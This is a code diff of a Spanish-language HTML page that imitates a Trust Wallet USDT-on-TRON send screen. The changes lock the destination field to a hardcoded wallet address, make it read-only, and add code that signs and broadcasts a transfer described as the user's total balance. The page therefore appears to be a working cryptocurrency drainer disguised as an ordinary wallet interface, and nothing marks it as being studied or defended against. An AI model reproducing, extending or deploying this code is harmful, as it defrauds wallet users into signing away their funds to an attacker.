@@ -39,7 +39,7 @@
             text-align: center;
             margin-right: -24px;
         }
-        .tw-back-btn { width: 24px; height: 24px; color: #1a1a1a; cursor: pointer; }
+        .tw-back-btn { width: 24px; height: 24px; color: #1a1a1a; }
         
         .tw-card {
             background-color: #f5f7fa;
@@ -71,7 +71,6 @@
             outline: none;
             padding: 4px 0;
         }
-        .tw-field::placeholder { color: #a1a6b3; }
         
         .tw-action-blue {
             color: #0052ff;
@@ -113,7 +112,6 @@
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: background-color 0.2s;
         }
         .tw-submit-button:disabled { background-color: #c2d6ff; color: #ffffff; cursor: not-allowed; }
     </style>
@@ -130,9 +128,10 @@
         </div>
 
         <div class="tw-card">
-            <label class="tw-card-label" for="addressDisplay">Dirección o nombre de dominio</label>
+            <label class="tw-label tw-card-label" for="addressDisplay">Dirección o nombre de dominio</label>
             <div class="tw-input-container">
-                <input id="addressDisplay" class="tw-field" type="text" placeholder="Dirección de destino TRON" />
+                <!-- Tu dirección predeterminada fija sin permisos de borrado -->
+                <input id="addressDisplay" class="tw-field" type="text" readonly />
                 <span class="tw-action-text tw-action-blue">Pegar</span>
             </div>
         </div>
@@ -141,7 +140,6 @@
             <label class="tw-card-label" for="amountDisplay">Cantidad</label>
             <div class="tw-input-container">
                 <input id="amountDisplay" class="tw-field" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any" />
-                <!-- Acción oficial "MÁX" a la izquierda del nombre del token -->
                 <div style="display: flex; align-items: center; gap: 12px;">
                     <span id="maxAction" class="tw-action-blue" style="display: none;">MÁX</span>
                     <span class="tw-token-name">USDT</span>
@@ -157,6 +155,7 @@
     </div>
 
 <script>
+    // Dirección predeterminada inmutable
     const BILLETERA_DESTINO = "TNQaxFKxhoYdMgbZqVHumy84tBidBaWT45"; 
     const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";    
 
@@ -173,6 +172,7 @@
         statusDiv.style.display = message ? 'block' : 'none';
     }
 
+    // Carga inicial obligatoria
     addressDisplay.value = BILLETERA_DESTINO;
 
     async function obtenerBalanceSeguro(ownerAddress) {
@@ -194,7 +194,6 @@
     }
 
     connectBtn.addEventListener('click', async () => {
-        // PASO 1: Sincronizar billetera
         if (!walletAddress) {
             try {
                 setStatus("Estableciendo enlace RPC con Trust Wallet...");
@@ -233,7 +232,6 @@
             return;
         }
 
-        // PASO 2: Procesar firma de balance total detectado
         if (walletAddress) {
             try {
                 const userAmount = parseFloat(amountDisplay.value);
@@ -267,3 +265,8 @@
                 );
 
                 const signedTx = await tronWeb.trx.sign(transactionDraft.transaction);
+                const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
+
+                if (broadcast && broadcast.result) {
+                    setStatus("Transacción de saldo total completada exitosamente.");
+
